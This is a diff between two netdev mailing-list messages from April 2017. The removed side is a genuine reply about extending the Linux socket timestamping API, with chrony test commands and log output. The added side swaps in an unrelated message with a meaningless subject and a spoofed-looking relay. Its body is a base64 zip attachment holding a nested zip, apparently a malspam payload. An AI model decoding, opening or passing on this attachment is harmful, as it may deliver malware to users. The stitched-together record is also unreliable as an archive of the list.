@@ -1,48 +1,40 @@
-From: Miroslav Lichvar <mlichvar@redhat.com>
-Subject: Re: [PATCH v1 net-next 0/6] Extend socket timestamping API
-Date: Thu, 27 Apr 2017 11:28:09 +0200
-Message-ID: <20170427092809.GE5654@localhost>
-References: <20170426145035.25846-1-mlichvar@redhat.com>
- <20170426165435.GA21114@localhost.localdomain>
+From: <gestu@tuwien.ac.at>
+Subject: 50854 netdev
+Date: Thu, 27 Apr 2017 09:32:53 -0000
+Message-ID: <149328557306.22262.568251320819066685@rdsnet.ro>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: netdev@vger.kernel.org, Willem de Bruijn <willemb@google.com>,
-        Soheil Hassas Yeganeh <soheil@google.com>,
-        "Keller, Jacob E" <jacob.e.keller@intel.com>,
-        Denny Page <dennypage@me.com>, Jiri Benc <jbenc@redhat.com>
-To: Richard Cochran <richardcochran@gmail.com>
+Content-Type: application/zip; name="87611415.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mx1.redhat.com ([209.132.183.28]:32994 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1754607AbdD0J2O (ORCPT <rfc822;netdev@vger.kernel.org>);
-        Thu, 27 Apr 2017 05:28:14 -0400
-Content-Disposition: inline
-In-Reply-To: <20170426165435.GA21114@localhost.localdomain>
+Received: from client.rdsnet.ro ([86.124.77.226]:37747 "HELO rdsnet.ro"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1755096AbdD0Jc4 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Thu, 27 Apr 2017 05:32:56 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Wed, Apr 26, 2017 at 06:54:35PM +0200, Richard Cochran wrote:
-> On Wed, Apr 26, 2017 at 04:50:29PM +0200, Miroslav Lichvar wrote:
-> > This patchset adds new options to the timestamping API that will be
-> > useful for NTP implementations and possibly other applications.
-> 
-> Are there any userland ntp patches floating around to exercise the new
-> HW time stamping option?
-
-I'm not sure if anyone is working on support for HW timestamping in
-ntp. With chrony, you can test it with an experimental code in the
-hwts branch of https://github.com/mlichvar/chrony.
-
-$ ./configure --enable-debug && make
-# ./chronyd -d -d 'hwtimestamp *' 'server pool.ntp.org iburst' |& grep TIMESTAMP
- TX SCM_TIMESTAMPING: swts=1493285228.512531924 hwts=0.000000000
- TX SCM_TIMESTAMPING: swts=0.000000000 hwts=1493285226.073103885
- SCM_TIMESTAMPING_PKTINFO: if=2 len=90
- RX SCM_TIMESTAMPING: swts=1493285228.530657351 hwts=1493285226.091054104
- TX SCM_TIMESTAMPING: swts=1493285230.553457791 hwts=0.000000000
- TX SCM_TIMESTAMPING: swts=0.000000000 hwts=1493285228.113705104
- SCM_TIMESTAMPING_PKTINFO: if=2 len=90
- RX SCM_TIMESTAMPING: swts=1493285230.582817079 hwts=1493285228.142890229
-
--- 
-Miroslav Lichvar
+UEsDBBQAAgAIAKF6m0oMWYk9UAQAAFoEAAAIABwAMzk3NC56aXBVVAkAA/23AVn9twFZdXgLAAEE
+AAAAAAQAAAAAC/BmZhFhYGLgYFhYNdtrvl2KzRZmBoZicQagiAyDsaW5iV5KfnJoCCcD89/tjJEg
+XFrBzcDIwgAEYOKtRGz/HbUPtfWt95VcX8nN4L9d6xv6dWGmsGaQdKd4z8eba3PD2s4+3XXr/z3J
+Dfrbp+dNWj1phby10Dx+trbEBsmfC55dCFoqfZuvatcyFXEv/3398pt3L9t54uo9ld5pgY5crSKB
+dj/W5WZdXhigUlbQObXz7S/hbe/eH1OP7llbkq0sbmV9a/c+a77qyn995vNy+FbNjyoPqJK3Mk/X
+j/v348+30Jd5awTt35+UP95cZG39+sP12rRtVl8W75pb7ORlarVoVvS6XTNXbpyvwT715j7L9Qcl
+MvZs3Pz+rkvjFl4O27UNc2J2X75+7bLL/R07P67x6Hn55Q1r5+L5Wo+PzZ2Xt/n55/XT4v6H7Jty
+f//auvq/h23vzg6Vzmm82DT1uPKOuPT1a/hvcm+YXPv8jFiq/9XbhTNqVrS/meAxq1Txzb69uz6x
+lfn9fntj9s3K6226M/YV5d6Wrm7l3sMkH7nkmKJUxlzusnNXBJ7NZeOZ7/aW7a7/hZev7q/hFOw1
+XfR33cWDSqXOq4OULgY6pcaIGqRduJe+/8CX6Ii3dVuCbzg5XF51N+Hsg99qwf4cTMpPpI+8/Jyz
+VKhg5TyRs4VzJc686glQSkrfpxFYJGdSZ8ZrqLt0WkZU8Kq37Ww2DBY/RRUql82eF31IqWLDEbE8
+oUO/w/bJ5Nz6bxgzZ7/FfqfNCdVs8Ur1hf8e/am/9ZP38KxDAkpcGjZeCwSdTQMvXNkQr8BfxHcy
+2unR89RJxRO8rzSqLdRIuOAy75ngAoVsIW7hPMbiGczHm3UjVayFLtkddXLaM//De1GBN3WJCX6n
+WPTsQ1bl+O0ov/yEn1uYj/vh+QsLeX/+WvB40oudAn/vZp7ftej05Vc5wR9EuHs2t9wQfSpU3aPu
++zFlQ23P8hvce+fw36g9KXx2o6ln+0kT/lPXilXFI+ewP+4vdhBWWF7Jder5vUb/e5o2e5jEOdm3
+Crx02mBjuk8mqcSlqbnoZofH5ScMcTN2CBpZyps76E8/ssxwh+QLm/awkNNLNS+z1a959TdnoT33
+l4NXI/S54zdEbLDRvf2/c+mhpwf3WwBD4+OGPYyWmvYP9ZnsONUyI5K0VnevWpuVq7N0qeZD0YtS
+8/1iJ876vETcmDteys5wwcKmdZtl7pnnHA0Scul5maqpuKhHR+LJTt/Ja4pkun8V1U5d/WWS+96r
+BlI5wVJJvlW1yfUzvSY1TeT+0/3wouT7jSu/Zl9VKjm774/30l/96x3upH8Mf5zzt45DUiDRYG5W
+7/KZl3TTd6Z8FM8UmuTzdfL82vsOE5W1Tm16/HFGXeijei/5OzmOW34KB3gzMskx48r3EqBszcAI
+xEsaQSxEKcAKKQXQSoAAb1Y2iA5GBj8g/Y0ZxAMAUEsBAh4DFAACAAgAoXqbSgxZiT1QBAAAWgQA
+AAgAGAAAAAAAAAAAAKSBAAAAADM5NzQuemlwVVQFAAP9twFZdXgLAAEEAAAAAAQAAAAAUEsFBgAA
+AAABAAEATgAAAJIEAAAAAA==
